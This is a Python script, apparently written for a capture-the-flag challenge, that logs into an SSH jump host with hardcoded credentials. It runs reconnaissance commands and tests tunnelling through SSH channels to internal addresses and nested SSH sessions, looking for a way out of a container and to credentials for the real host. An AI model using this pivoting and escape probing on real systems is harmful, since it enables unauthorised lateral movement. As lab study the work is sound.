#!/usr/bin/env python3
"""
等待新环境后运行此脚本

关键测试：探索SSH通道类型和特性
"""

import paramiko
import time
import sys

TARGET_HOST = "61.147.171.35"
TARGET_PORT = 58677
USERNAME = "ctf"
PASSWORD = "123456"

# 从命令行获取新的主机和端口
if len(sys.argv) >= 3:
    TARGET_HOST = sys.argv[1]
    TARGET_PORT = int(sys.argv[2])

print(f"[*] 目标: {TARGET_HOST}:{TARGET_PORT}")

def get_session():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(TARGET_HOST, TARGET_PORT, USERNAME, PASSWORD, timeout=10)
    return client

def test_basic_commands():
    """基本命令测试"""
    print("\n" + "=" * 70)
    print("[*] 基本命令测试")
    print("=" * 70)
    
    client = get_session()
    
    commands = [
        "id",
        "pwd", 
        "ls -la /",
        "cat /init",
        "cat /proc/1/cmdline | tr '\\0' ' '",
        "mount",
        "ip addr",
        "cat /etc/resolv.conf",
    ]
    
    for cmd in commands:
        print(f"\n[cmd] {cmd}")
        try:
            stdin, stdout, stderr = client.exec_command(cmd, timeout=5)
            out = stdout.read().decode(errors='replace')
            err = stderr.read().decode(errors='replace')
            if out:
                print(out[:500])
            if err and "busy" not in err:
                print(f"[stderr] {err[:200]}")
            elif "busy" in err:
                print("[!] 容器busy，需要新环境")
                client.close()
                return False
        except Exception as e:
            print(f"[!] 错误: {e}")
    
    client.close()
    return True

def test_channel_types():
    """测试各种通道类型"""
    print("\n" + "=" * 70)
    print("[*] 测试通道类型")
    print("=" * 70)
    
    client = get_session()
    transport = client.get_transport()
    
    # 测试direct-tcpip到各种地址
    print("\n[*] direct-tcpip测试:")
    targets = [
        ("localhost", 22),
        ("127.0.0.1", 22),
        ("172.17.0.1", 22),
        ("10.42.0.1", 22),
        ("172.17.0.1", 80),
        ("169.254.169.250", 53),  # DNS
    ]
    
    for host, port in targets:
        try:
            ch = transport.open_channel("direct-tcpip", (host, port), ("127.0.0.1", 0))
            ch.settimeout(2)
            try:
                data = ch.recv(256)
                print(f"  [+] {host}:{port} => {data[:60]}")
            except:
                print(f"  [?] {host}:{port} => 连接成功，无数据")
            ch.close()
        except Exception as e:
            err_str = str(e)
            if len(err_str) > 50:
                err_str = err_str[:50] + "..."
            print(f"  [-] {host}:{port} => {err_str}")
    
    # 测试forwarded-tcpip (反向端口转发)
    print("\n[*] tcpip-forward (反向端口转发)测试:")
    try:
        port = transport.request_port_forward("", 0)
        print(f"  [+] 成功，分配端口: {port}")
        transport.cancel_port_forward("", port)
    except Exception as e:
        print(f"  [-] 失败: {e}")
    
    client.close()

def test_nested_ssh_to_localhost():
    """通过direct-tcpip嵌套SSH到localhost"""
    print("\n" + "=" * 70)
    print("[*] 嵌套SSH到localhost")
    print("=" * 70)
    
    client1 = get_session()
    t1 = client1.get_transport()
    
    print(f"[1] Host Key: {t1.get_remote_server_key().get_fingerprint().hex()}")
    
    # 打开到localhost:22的通道
    ch = t1.open_channel("direct-tcpip", ("localhost", 22), ("127.0.0.1", 0))
    
    # 在通道上建立SSH
    t2 = paramiko.Transport(ch)
    t2.connect()
    
    print(f"[2] Host Key: {t2.get_remote_server_key().get_fingerprint().hex()}")
    print(f"    Same key? {t1.get_remote_server_key().get_fingerprint() == t2.get_remote_server_key().get_fingerprint()}")
    
    # 认证
    t2.auth_password(USERNAME, PASSWORD)
    print("[2] 认证成功")
    
    # 执行命令
    ch2 = t2.open_channel("session")
    ch2.exec_command("id; cat /proc/1/cmdline | tr '\\0' ' '; hostname")
    time.sleep(1)
    out = ch2.recv(4096).decode(errors='replace')
    err = ch2.recv_stderr(4096).decode(errors='replace')
    print(f"[2] Output: {out}")
    if err:
        print(f"[2] Stderr: {err}")
    
    ch2.close()
    t2.close()
    client1.close()

def test_nested_ssh_to_real_host():
    """通过direct-tcpip嵌套SSH到真实主机172.17.0.1"""
    print("\n" + "=" * 70)
    print("[*] 嵌套SSH到真实主机172.17.0.1")
    print("=" * 70)
    
    client1 = get_session()
    t1 = client1.get_transport()
    
    # 打开到172.17.0.1:22的通道
    ch = t1.open_channel("direct-tcpip", ("172.17.0.1", 22), ("127.0.0.1", 0))
    
    # 在通道上建立SSH
    t2 = paramiko.Transport(ch)
    t2.connect()
    
    print(f"Host Key: {t2.get_remote_server_key().get_fingerprint().hex()}")
    print(f"Server: {t2.remote_version}")
    
    # 检查支持的认证方法
    try:
        t2.auth_none("root")
    except paramiko.BadAuthenticationType as e:
        print(f"支持的认证: {e.allowed_types}")
    except paramiko.AuthenticationException:
        print("需要认证")
    
    t2.close()
    client1.close()

def analyze_dropbear_behavior():
    """分析dropbear的行为"""
    print("\n" + "=" * 70)
    print("[*] 分析dropbear行为")
    print("=" * 70)
    print("""
    观察：
    1. 外部连接到dropbear -> 创建nspawn容器
    2. direct-tcpip到localhost:22 -> 返回同一个dropbear
    3. 嵌套SSH到localhost -> 创建另一个nspawn容器
    4. direct-tcpip到172.17.0.1:22 -> 真实的OpenSSH
    
    FakeJumpServer攻击思路：
    - 当使用 -J (ProxyJump) 时，SSH客户端通过 -W (stdio forward) 转发
    - dropbear作为跳板机，用direct-tcpip连接目标
    - 如果目标是localhost，dropbear返回自己（创建新容器）
    - 如果目标是172.17.0.1，连接到真实OpenSSH
    
    关键问题：
    - 如何获得172.17.0.1的凭据？
    - dropbear是否有存储的密钥？
    - 是否有其他方式绕过容器？
    """)

if __name__ == "__main__":
    if test_basic_commands():
        test_channel_types()
        test_nested_ssh_to_localhost()
        test_nested_ssh_to_real_host()
    analyze_dropbear_behavior()
